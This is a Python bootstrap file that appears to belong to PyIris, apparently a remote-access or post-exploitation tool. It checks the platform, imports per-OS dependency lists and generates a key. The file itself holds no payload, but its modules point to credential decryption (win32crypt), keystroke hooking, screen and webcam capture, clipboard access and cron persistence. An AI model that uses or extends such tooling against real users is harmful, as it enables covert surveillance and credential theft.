# API
# done
windows_modules = ['pyperclip', 'win32crypt', 'cv2', 'pythoncom', 'mss', 'PIL', 'pyautogui', 'colorama',
				   'cryptography', 'pyWinhook', 'pycaw', 'readline']
linux_modules = ['cv2', 'mss', 'PIL', 'Xlib', 'pyautogui', 'pyperclip', 'pyWinhook', 'crontab', 'cryptography',
				 'readline', 'alsaaudio']


def main(self):
	try:
		import sys
		import os
		os.system("")
		self.log.inf('Starting...')
		if sys.version_info[0] == 2:
			self.log.err("PyIris is no longer deemed compatible with python 2 please use python 3")
			return {"status": "error", "message": "PyIris is no longer deemed compatible with python 2 please use python 3", "data": None}
		self.log.pos("Using Python Version " + str(sys.version_info[0]) + " - OK")
		import platform
		import pyiris_api.library.modules.keygen as keygen
		if platform.uname()[0] == 'Windows':
			self.log.pos("OS Windows - OK")
			for i in windows_modules:
				exec('import ' + i)
				self.log.pos("Successfully imported : " + i + " - OK")
		elif platform.uname()[0] == 'Linux':
			self.log.pos("OS Linux - OK")
			for i in linux_modules:
				exec('import ' + i)
				self.log.pos("Successfully imported : " + i + " - OK")
		else:
			self.log.err("OS " + platform.uname()[0] + " - Error, Not Supported")
			return {"status": "error", "message": "OS " + platform.uname()[0] + " - Error, Not Supported", "data": None}
		keygen_output = keygen.main(self, False, self.config.key)
		if keygen_output["status"] == "error":
			return {"status": "error", "message": f"Error generating key: {keygen_output['message']}", "data": keygen_output["data"]}
		return {"status": "ok", "message": "Bootstrap Successful", "data": None}
	except ImportError as e:
		self.log.err('Could not import : ' + str(e) + ' - Error, missing packages or packages not installed from setup folder')
		return {"status": "error", "message": "Import Error: " + str(e), "data": None}
	except Exception as e:
		self.log.err('Unexpected error when bootstrapping : ' + str(e))
		return {"status": "error", "message": str(e), "data": None}
